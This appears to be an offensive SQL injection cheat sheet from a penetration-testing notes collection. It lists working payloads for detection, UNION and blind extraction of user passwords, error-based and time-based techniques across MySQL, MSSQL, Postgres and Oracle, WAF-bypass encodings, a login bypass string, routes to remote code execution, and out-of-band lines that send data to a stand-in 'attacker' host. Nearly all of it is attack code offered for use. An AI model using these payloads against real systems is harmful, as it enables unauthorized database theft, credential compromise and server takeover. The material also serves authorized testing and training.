# SQL Injection

The bug is a string that becomes syntax. Find the parser boundary, then cross it.

---

## Entry points

```
?id=  ?sort=  ?order=  ?filter=  ?search=  ?category=  ?page=
login fields  search boxes  JSON values  cookie values  X-Forwarded-For (logged)
filename in upload  report/filter builders  GraphQL args  ORDER BY / LIMIT clauses
```

---

## Detection ladder

1. `'` → error, 500, or body change.
2. `''` → returns to baseline (proves the quote is the issue).
3. `' AND '1'='1` vs `' AND '1'='2` → boolean difference.
4. `' AND SLEEP(3)-- -` → timing.
5. `' AND 1=1-- -` vs `' AND 1=2-- -` → arithmetic boolean.
6. `' ORDER BY 1-- -` … increment until error → column count.

Always URL-encode in the query string; keep raw in the body.

---

## Union

```
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,@@version,3-- -
```

Find the printable column, then extract:

```
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,concat(user,0x3a,password),3 FROM users-- -
```

---

## Blind boolean

```
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT ...),1,1))>100-- -
```

Automate with a binary-search script rather than char-by-char by hand.

---

## Blind time

```
' AND SLEEP(3)-- -                      MySQL
'; WAITFOR DELAY '0:0:3'-- -            MSSQL
' AND pg_sleep(3)-- -                   Postgres
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -   Oracle
```

Confirm with 3 runs; a single 3 s response can be noise.

---

## Error-based extraction

```
MySQL:    extractvalue(1,concat(0x7e,(select version())))
          updatexml(1,concat(0x7e,(select version())),1)
MSSQL:    convert(int,(select @@version))
Postgres: cast((select version()) as int)
Oracle:   ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))
```

---

## Out-of-band

```
MySQL:    LOAD_FILE('\\\\attacker\\share')  or  SELECT ... INTO OUTFILE
MSSQL:    xp_dirtree '\\attacker\share'
Oracle:   UTL_HTTP.REQUEST('http://attacker/')
Postgres: COPY ... TO PROGRAM / dblink
```

---

## WAF bypass

See `03-bypass/waf-bypass.md`. Core set:

```
UN/**/ION SEL/**/ECT   %27   %2527   ' %0a AND %0a '1'='1
/*!50000UNION*/        CHAR(39)      0x3c3f...
```

---

## Second-order

The payload is stored clean and used later in a query (report builder, export, admin
search). Inject into the *name* field, then trigger the report.

---

## NoSQL injection

See `nosql-injection.md` — different grammar, same idea.

---

## Impact

- Auth bypass: `' OR 1=1-- -` in the login.
- Data dump: union or blind extraction.
- File read/write: `LOAD_FILE`, `INTO OUTFILE`.
- RCE: `xp_cmdshell` (MSSQL), `COPY ... PROGRAM` (Postgres), UDF (MySQL).

---

## Go deeper

1. Test `ORDER BY` and `LIMIT` separately — they take identifiers, not strings.
2. Test the `sort` param with `(select 1)` and `case when`.
3. Test numeric contexts without quotes (`id=1 AND 1=1`).
4. Test the second-order path.
5. Check the DB user's privileges (`current_user`, `is_srvrolemember`).

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
